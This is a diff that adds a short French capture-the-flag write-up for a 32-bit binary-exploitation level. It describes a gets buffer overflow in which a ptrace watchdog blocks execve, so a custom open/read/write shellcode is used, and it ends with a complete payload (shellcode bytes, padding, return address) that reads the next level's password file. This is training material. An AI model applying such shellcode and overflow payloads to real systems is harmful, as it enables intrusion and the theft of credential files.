@@ -1,0 +1,17 @@
+On disass le binaire.
+On remarque tout de suite l'appel a la fonction gets qui est unsafe.
+On va donc pouvoir executer une attaque de type buffer overflow.
+On va injecter un shellcode dans le buffer et overwrite le contenu de eip pour le faire pointer vers l'adresse de notre shellcode.
+Cependant, on remarque que le processus parent surveille l'enfant grace a ptrace.
+Plus exactement, il surveille sa memoire a l'offset 44 ce qui correspond au registre eax.
+Si ce registre contient la valeur 11, alors l'enfant est terminé par un SIGKILL.
+Cette valeur correspond au syscall execve.
+Il faut donc ecrire un shellcode custom qui n'utilise pas ce syscall.
+On va donc ecrire un shellcode qui appelle, open, read et write sur le fichier \home\user\level05\.pass
+(voir shellcode.S dans le dossier Ressources)
+
+On compile avec `gcc -c -m32 shellcode.S -o shellcode.o` puis on dump le binaire pour extraire les bytes de notre shellcode.
+
+Il ne reste plus qu'a utiliser le payload suivant :
+python -c 'print "\x90"*40 + "1\xc0Phpassh05/.hevelhs//lhuserhme//h//ho1\xd21\xc9\x89\xe3\xb8\x05\x00\x00\x00\xcd\x80\x83\xecB\x89\xc3\x89\xe1\xbaB\x00\x00\x00\xb8\x03\x00\x00\x00\xcd\x80\xbb\x01\x00\x00\x00\xb8\x04\x00\x00\x00\xcd\x80" + "A"*34 + "\xb0\xd6\xff\xff"' > /tmp/test
+./level04 < /tmp/test
